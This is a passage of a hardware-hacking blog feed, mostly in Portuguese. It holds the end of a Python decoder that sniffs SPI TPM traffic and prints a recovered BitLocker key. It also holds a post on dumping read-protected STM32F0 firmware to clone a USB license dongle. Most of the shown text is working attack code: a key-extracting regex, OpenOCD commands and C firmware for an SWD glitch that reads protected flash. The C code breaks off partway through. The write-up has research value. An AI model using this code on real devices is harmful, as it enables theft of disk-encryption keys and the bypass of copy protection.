+            <span class="bp">self</span><span class="p">.</span><span class="n">opIsRead</span> <span class="o">=</span> <span class="p">(</span><span class="n">mosi</span> <span class="o">&amp;</span> <span class="n">OPERATION_MASK</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">7</span>    <span class="c1"># 1 = read, 0 = write
+</span>            <span class="bp">self</span><span class="p">.</span><span class="n">numBytes</span> <span class="o">=</span> <span class="p">(</span><span class="n">mosi</span> <span class="o">&amp;</span> <span class="n">SIZE_MASK</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>          <span class="c1"># Minimum transfer = 1 byte
+</span>            <span class="bp">self</span><span class="p">.</span><span class="n">addrIdx</span> <span class="o">=</span> <span class="mi">0</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">bytesRead</span> <span class="o">=</span> <span class="p">[]</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">READING_ARG</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">transactionStart</span> <span class="o">=</span> <span class="n">ss</span>
+        <span class="k">elif</span> <span class="bp">self</span><span class="p">.</span><span class="n">state</span> <span class="o">==</span> <span class="n">State</span><span class="p">.</span><span class="n">READING_ARG</span><span class="p">:</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">addr</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="n">mosi</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">addrIdx</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">addrIdx</span> <span class="o">+</span> <span class="mi">1</span>
+            <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">addrIdx</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
+                <span class="k">if</span> <span class="n">miso</span> <span class="o">&amp;</span> <span class="n">WAIT_MASK</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span> <span class="c1"># Wait state
+</span>                    <span class="bp">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">WAITING</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="bp">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">TRANSFER</span>
+        <span class="k">elif</span> <span class="bp">self</span><span class="p">.</span><span class="n">state</span> <span class="o">==</span> <span class="n">State</span><span class="p">.</span><span class="n">WAITING</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">miso</span> <span class="o">&amp;</span> <span class="n">WAIT_MASK</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span> <span class="c1"># Wait finished
+</span>                <span class="bp">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">TRANSFER</span>
+        <span class="k">elif</span> <span class="bp">self</span><span class="p">.</span><span class="n">state</span> <span class="o">==</span> <span class="n">State</span><span class="p">.</span><span class="n">TRANSFER</span><span class="p">:</span>
+            <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">opIsRead</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span> <span class="c1"># Read from device
+</span>                <span class="bp">self</span><span class="p">.</span><span class="n">bytesRead</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">miso</span><span class="p">)</span>
+            <span class="k">else</span><span class="p">:</span>   <span class="c1"># Read from controller
+</span>                <span class="bp">self</span><span class="p">.</span><span class="n">bytesRead</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">mosi</span><span class="p">)</span>
+            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">bytesRead</span><span class="p">)</span> <span class="o">==</span> <span class="bp">self</span><span class="p">.</span><span class="n">numBytes</span><span class="p">:</span>
+                <span class="bp">self</span><span class="p">.</span><span class="n">transactionEnd</span> <span class="o">=</span> <span class="n">es</span>
+                <span class="c1">#print("Transaction: ", self.bytesRead)
+</span>                <span class="bp">self</span><span class="p">.</span><span class="n">report_transaction</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">transactionStart</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">transactionEnd</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">opIsRead</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">addr</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">bytesRead</span><span class="p">)</span>
+                <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">addr</span> <span class="ow">in</span> <span class="n">tpmRegisters</span> <span class="ow">and</span> <span class="n">tpmRegisters</span><span class="p">[</span><span class="bp">self</span><span class="p">.</span><span class="n">addr</span><span class="p">]</span> <span class="o">==</span> <span class="s">"TPM_DATA_FIFO_0"</span><span class="p">:</span>
+                    <span class="bp">self</span><span class="p">.</span><span class="n">putfifo</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">transactionStart</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">transactionEnd</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">opIsRead</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">bytesRead</span><span class="p">)</span>
+                <span class="k">elif</span> <span class="bp">self</span><span class="p">.</span><span class="n">opIsRead</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                    <span class="bp">self</span><span class="p">.</span><span class="n">endfifo</span><span class="p">()</span>
+
+                <span class="bp">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">READING_OP</span>
+
+    <span class="n">fifoType</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> <span class="c1"># 0 = Write, 1 = Read
+</span>    <span class="n">fifoData</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">fifoStart</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">fifoEnd</span> <span class="o">=</span> <span class="mi">0</span>
+
+    <span class="k">def</span> <span class="nf">endfifo</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">fifoType</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+            <span class="k">return</span> <span class="c1"># No FIFO
+</span>        <span class="bp">self</span><span class="p">.</span><span class="n">report_fifo</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">fifoStart</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">fifoEnd</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">fifoType</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">fifoData</span><span class="p">)</span>
+
+        <span class="n">data</span> <span class="o">=</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="s">"{:02X}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="bp">self</span><span class="p">.</span><span class="n">fifoData</span><span class="p">])</span>
+        <span class="n">key</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">'2C000[0-6]000[1-9]000[0-1]000[0-5]200000(\w{64})'</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">key</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">"Bitlocker Key: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">report_bitlocker_key</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">fifoStart</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">fifoEnd</span><span class="p">,</span> <span class="n">key</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">fifoData</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">fifoType</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
+
+    <span class="k">def</span> <span class="nf">putfifo</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">ttype</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+        <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">fifoType</span> <span class="o">!=</span> <span class="n">ttype</span><span class="p">:</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">endfifo</span><span class="p">()</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">fifoType</span> <span class="o">=</span> <span class="n">ttype</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">fifoStart</span> <span class="o">=</span> <span class="n">start</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">fifoEnd</span> <span class="o">=</span> <span class="n">end</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">fifoData</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</code></pre></div></div>]]></content><author><name>Lucas Teske</name></author><category term="Reverse Engineering" /><category term="Satellite" /><category term="SDR" /><category term="Flash" /><category term="PAX" /><category term="Hardware Hacking" /><category term="RE" /><category term="Reverse Engineering" /><category term="NAND" /><category term="PAX" /><category term="RT809H" /><summary type="html"><![CDATA[O TPM 2.0, também conhecido como Trusted Platform Module 2.0, é um recurso de segurança de hardware que está incorporado em muitos computadores modernos. Sua finalidade é proporcionar uma maneira segura de armazenar chaves criptográficas e outros dados sensíveis, tais como senhas e certificados digitais, visando proteger contra diversas ameaças de segurança, incluindo acesso não autorizado ao hardware e software de um computador. O TPM 2.0 representa uma evolução da especificação original do TPM, desenvolvida pelo Trusted Computing Group (TCG), e apresenta recursos e capacidades adicionais, como suporte a algoritmos criptográficos adicionais e a capacidade de armazenar quantidades maiores de dados.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/gepeto/tpm2.0.jpg" /><media:content medium="image" url="https://lucasteske.dev/assets/gepeto/tpm2.0.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">STM32F0x Protected Firmware Dumper</title><link href="https://lucasteske.dev/2024/01/stm32f0x-protected-firmware-dumper" rel="alternate" type="text/html" title="STM32F0x Protected Firmware Dumper" /><published>2024-01-16T05:23:00+00:00</published><updated>2024-01-16T05:23:00+00:00</updated><id>https://lucasteske.dev/2024/01/stm32f0x-protected-firmware-dumper</id><content type="html" xml:base="https://lucasteske.dev/2024/01/stm32f0x-protected-firmware-dumper"><![CDATA[<p>No processo do meu hobby de hackear hardware, encontrei um clone chinês de um dongle HASP HL equipado com um processador STM32F042G6U6. Minha intenção era cloná-lo, e durante minha exploração, descobri quatro pinos da interface de depuração SWD localizados na parte inferior da PCB. Soldei um conector de 4 pinos nesses pinos para facilitar o acesso.</p>
+
+<p>Utilizando meu Segger J-Link como uma sonda de depuração, embora qualquer adaptador JTAG deva ser suficiente, eu o combinei com o OpenOCD. Dado que o chipset é reconhecido pelo OpenOCD, eu criei um script para extrair todos os dados possíveis, condicionados à habilitação.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>adapter driver jlink
+transport select swd
+adapter_khz 4000
+source [find target/stm32f0x.cfg]
+init
+dap info
+reset halt
+flash read_bank 0 firmwareF1.bin 0 0x8000
+reset
+shutdown
+</code></pre></div></div>
+
+<p>Mas, encontrei um obstáculo - a proteção RDP (Read-Out Protection) do dispositivo estava ativada, mesmo com o SWD ativo. Sem problemas, pensei, e tentei contornar isso com injeção de falha de tensão. No entanto, o gerador de clock interno no dispositivo tornou a interferência no clock inviável. Após algumas horas sem progresso, ficou claro que eu precisava de um novo plano.</p>
+
+<p>Minha busca por alternativas me levou a um artigo abrangente detalhando três metodologias para extrair memória protegida:</p>
+
+<p><a href="https://www.aisec.fraunhofer.de/en/FirmwareProtection.html">https://www.aisec.fraunhofer.de/en/FirmwareProtection.html</a></p>
+
+<p>Tentei o Método de Boot a Frio, mas sem sucesso - provavelmente porque eu não conseguia mexer no relógio do dispositivo, e isso é praticamente um ponto crucial para que funcionasse. O método UVC? Muito arriscado, e eu não estava disposto a arruinar o dongle. Então, restou a interferência no Porta de Depuração SWD.</p>
+
+<p>Havia uma Prova de Conceito (PoC) para esta falha, e ela tinha algumas informações boas, mas era tudo sobre código STM32 com um monte de coisas específicas do dispositivo. Eu precisava de algo mais universal. Depois de analisar a PoC e o artigo, misturei um pouco do meu próprio conhecimento e criei um novo código.</p>
+
+<p>Para o campo de testes, conectei um Raspberry Pi Pico com <a href="http://platform.io/">platform.io</a>. Tive que ir direto com o protocolo SWD, pois sondas de depuração padrão como meu J-Link eram muito invasivas na inicialização do dispositivo. Essa falha precisava de uma ação rápida na leitura da memória flash, e cada milissegundo contava.</p>
+
+<p>Aqui está o ponto crucial - a proteção do código só entra em ação quando você tenta tocar na memória flash com o modo de depuração ativado. Mas se você for rápido, pode capturar um DWORD da flash antes que as portas se fechem.</p>
+
+<p>Para extrair o firmware inteiro, é uma dança com o pino de reset e a fonte de energia do dispositivo. Você tem que ciclar a energia para resetar a bandeira do modo de depuração. Aqui está o passo a passo:</p>
+
+<ol>
+  <li>Acione o pino de reset</li>
+  <li>Ligue o dispositivo</li>
+  <li>Solte o pino de reset</li>
+  <li>Faça a leitura</li>
+  <li>Corte a energia</li>
+  <li>Repita o processo</li>
+</ol>
+
+<p>O Raspberry Pi Pico foi tudo o que eu precisei para alimentar o dispositivo, já que o STM32 não consome muita energia. Se você estiver lidando com algo que exija mais energia, um transistor ou relé para alternar a energia pode ser a solução. Você pode conferir toda a operação e o código em <a href="https://github.com/racerxdl/stm32f0-pico-dump">https://github.com/racerxdl/stm32f0-pico-dump</a> ou disponível abaixo.</p>
+
+<p><img src="/assets/posts/patreon/Pasted image 20230124035820.png" alt="Dump funcionando de bytes" />
+<em>Uma imagem mostrando fluxos de dados DWORD do firmware STM32F0 sendo transmitidos em tempo real via porta serial do Raspberry Pi Pico, iluminando o terminal com linhas de código extraído.</em></p>
+
+<h2 id="code">Code</h2>
+
+<h3 id="halc">hal.c</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+ * Copyright (C) 2017 Obermaier Johannes
+ * Copyright (C) 2022 Lucas Teske
+ *
+ * This Source Code Form is subject to the terms of the MIT License.
+ * If a copy of the MIT License was not distributed with this file,
+ * you can obtain one at https://opensource.org/licenses/MIT
+ */</span>
+
+<span class="cp">#include</span> <span class="cpf">"main.h"</span><span class="cp">
+</span>
+<span class="kt">void</span> <span class="nf">targetInit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">targetPowerOff</span><span class="p">();</span>
+    <span class="n">targetReset</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">targetReset</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">TARGET_RESET_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">targetRestore</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">TARGET_RESET_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">targetPowerOff</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">TARGET_PWR_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">targetPowerOn</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">TARGET_PWR_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="readerc">reader.c</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+ * Copyright (C) 2017 Obermaier Johannes
+ * Copyright (C) 2022 Lucas Teske
+ *
+ * This Source Code Form is subject to the terms of the MIT License.
+ * If a copy of the MIT License was not distributed with this file,
+ * you can obtain one at https://opensource.org/licenses/MIT
+ */</span>
+
+<span class="cp">#include</span> <span class="cpf">"main.h"</span><span class="cp">
+#include</span> <span class="cpf">"swd.h"</span><span class="cp">
+</span>
+<span class="cm">/* Reads one 32-bit word from read-protection Flash memory. Address must be 32-bit aligned */</span>
+<span class="n">swdStatus_t</span> <span class="nf">extractFlashData</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="k">const</span> <span class="n">address</span><span class="p">,</span> <span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">swdStatus_t</span> <span class="n">dbgStatus</span><span class="p">;</span>
+
+    <span class="cm">/* Add some jitter on the moment of attack (may increase attack effectiveness) */</span>
+    <span class="k">static</span> <span class="kt">uint16_t</span> <span class="n">delayJitter</span> <span class="o">=</span> <span class="n">DELAY_JITTER_MS_MIN</span><span class="p">;</span>
+
+    <span class="kt">uint32_t</span> <span class="n">extractedData</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
+    <span class="kt">uint32_t</span> <span class="n">idCode</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
+
+    <span class="cm">/* Limit the maximum number of attempts PER WORD */</span>
+    <span class="kt">uint32_t</span> <span class="n">numReadAttempts</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
+
+    <span class="cm">/* try up to MAX_READ_TRIES times until we have the data */</span>
+    <span class="k">do</span> <span class="p">{</span>
+        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">LED1_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
+
+        <span class="n">targetPowerOn</span><span class="p">();</span>
+
+        <span class="n">delay</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
+
+        <span class="n">dbgStatus</span> <span class="o">=</span> <span class="n">swdInit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">idCode</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">dbgStatus</span> <span class="o">==</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">dbgStatus</span> <span class="o">=</span> <span class="n">swdEnableDebugIF</span><span class="p">();</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">dbgStatus</span> <span class="o">==</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">dbgStatus</span> <span class="o">=</span> <span class="n">swdSetAP32BitMode</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">dbgStatus</span> <span class="o">==</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">dbgStatus</span> <span class="o">=</span> <span class="n">swdSelectAHBAP</span><span class="p">();</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">dbgStatus</span> <span class="o">==</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">targetRestore</span><span class="p">();</span>
+            <span class="n">delay</span><span class="p">(</span><span class="n">delayJitter</span><span class="p">);</span>
+
+            <span class="cm">/* The magic happens here! */</span>
+            <span class="n">dbgStatus</span> <span class="o">=</span> <span class="n">swdReadAHBAddr</span><span class="p">((</span><span class="n">address</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFCu</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">extractedData</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="n">targetReset</span><span class="p">();</span>
+
+        <span class="cm">/* Check whether readout was successful. Only if swdStatusOK is returned, extractedData is valid */</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">dbgStatus</span> <span class="o">==</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
+            <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">extractedData</span><span class="p">;</span>
+            <span class="n">digitalWrite</span><span class="p">(</span><span class="n">LED1_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="o">++</span><span class="n">numReadAttempts</span><span class="p">;</span>
+
+            <span class="n">delayJitter</span> <span class="o">+=</span> <span class="n">DELAY_JITTER_MS_INCREMENT</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">delayJitter</span> <span class="o">&gt;=</span> <span class="n">DELAY_JITTER_MS_MAX</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">delayJitter</span> <span class="o">=</span> <span class="n">DELAY_JITTER_MS_MIN</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="n">targetPowerOff</span><span class="p">();</span>
+
+        <span class="n">delay</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+        <span class="n">targetRestore</span><span class="p">();</span>
+        <span class="n">delay</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+        <span class="n">targetReset</span><span class="p">();</span>
+        <span class="n">delay</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+
+    <span class="p">}</span> <span class="k">while</span> <span class="p">((</span><span class="n">dbgStatus</span> <span class="o">!=</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">numReadAttempts</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">MAX_READ_ATTEMPTS</span><span class="p">)));</span>
+
+    <span class="k">return</span> <span class="n">dbgStatus</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="swdc">swd.c</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+ * Copyright (C) 2017 Obermaier Johannes
+ * Copyright (C) 2022 Lucas Teske
+ *
+ * This Source Code Form is subject to the terms of the MIT License.
+ * If a copy of the MIT License was not distributed with this file,
+ * you can obtain one at https://opensource.org/licenses/MIT
+ */</span>
+
+<span class="cp">#include</span> <span class="cpf">"swd.h"</span><span class="cp">
+</span>
+<span class="cp">#include</span> <span class="cpf">"main.h"</span><span class="cp">
+</span>
+<span class="cp">#define MWAIT __asm__ __volatile__( \
+    ".syntax unified 		\n"          \
+    "	movs r0, #0x20 		\n"          \
+    "1: 	subs r0, #1 		\n"          \
+    "	bne 1b 			\n"                 \
+    ".syntax divided"               \
+    :                               \
+    :                               \
+    : "cc", "r0")
+</span>
+<span class="cp">#define N_READ_TURN (3u)
+</span>
+<span class="k">static</span> <span class="kt">uint8_t</span> <span class="nf">swdParity</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="k">const</span><span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">);</span>
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDatasend</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="k">const</span><span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">);</span>
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataIdle</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataPP</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdTurnaround</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdReset</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataRead</span><span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">);</span>
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdBuildHeader</span><span class="p">(</span><span class="n">swdAccessDirection_t</span> <span class="k">const</span> <span class="n">adir</span><span class="p">,</span> <span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint8_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">header</span><span class="p">);</span>
+<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">);</span>
+<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="k">const</span> <span class="n">data</span><span class="p">);</span>
+<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdReadAP0</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">);</span>
+
+<span class="k">static</span> <span class="kt">uint8_t</span> <span class="nf">swdParity</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="k">const</span><span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">uint8_t</span> <span class="n">par</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
+    <span class="kt">uint8_t</span> <span class="n">cdata</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
+    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">&amp;</span> <span class="mh">0x07u</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0u</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">cdata</span> <span class="o">=</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
+            <span class="o">++</span><span class="n">data</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="n">par</span> <span class="o">^=</span> <span class="p">(</span><span class="n">cdata</span> <span class="o">&amp;</span> <span class="mh">0x01u</span><span class="p">);</span>
+        <span class="n">cdata</span> <span class="o">&gt;&gt;=</span> <span class="mi">1u</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="n">par</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDatasend</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="k">const</span><span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">uint8_t</span> <span class="n">cdata</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
+    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">&amp;</span> <span class="mh">0x07u</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x00u</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">cdata</span> <span class="o">=</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
+            <span class="o">++</span><span class="n">data</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span> <span class="p">((</span><span class="n">cdata</span> <span class="o">&amp;</span> <span class="mh">0x01u</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x01u</span><span class="p">)</span> <span class="p">{</span>
